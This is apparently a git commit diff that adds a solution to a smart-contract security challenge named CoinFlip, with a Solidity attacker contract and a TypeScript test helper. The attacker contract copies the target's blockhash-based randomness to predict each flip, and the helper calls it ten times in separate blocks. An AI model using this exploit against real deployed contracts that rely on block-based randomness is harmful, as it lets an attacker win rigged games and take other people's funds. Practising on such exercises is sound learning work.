9409048d8ed4f13361c1da6abf36ac5ef4beb95a
tuds <twilkinson573@gmail.com>
2022-08-11 11:57:24 +0100

    Add Solution for Challenge 1. Coinflip

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -2,6 +2,10 @@
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
+interface ICoinFlip {
+    function flip(bool) external returns (bool);
+}
+
 contract AttackingCoinFlip {
     address public contractAddress;
 
@@ -10,6 +14,17 @@ contract AttackingCoinFlip {
     }
 
     function hackContract() external {
-        // Code me!
+
+        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        uint256 coinFlip = blockValue / factor;
+        bool side = coinFlip == 1 ? true : false;
+
+        ICoinFlip(contractAddress).flip(side);
     }
 }
+
+// Plan: duplicate the pseudo-randomness logic in CoinFlip::flip to return the same value
+// Run it 10 separate times in the helper, since tx's can't be from the same block number
+
--- contracts/1. CoinFlip/CoinFlipHelper.ts
+++ contracts/1. CoinFlip/CoinFlipHelper.ts
@@ -2,7 +2,11 @@ import { expect } from "chai";
 import { ethers } from "hardhat";
 
 const helper = async (victim: any, attacker: any) => {
-  // add code here that will help you pass the test
+
+  for(let i = 0; i<10; i++) {
+    let tx = await attacker.hackContract();
+    await tx.wait();
+  }
 };
 
 export default helper;
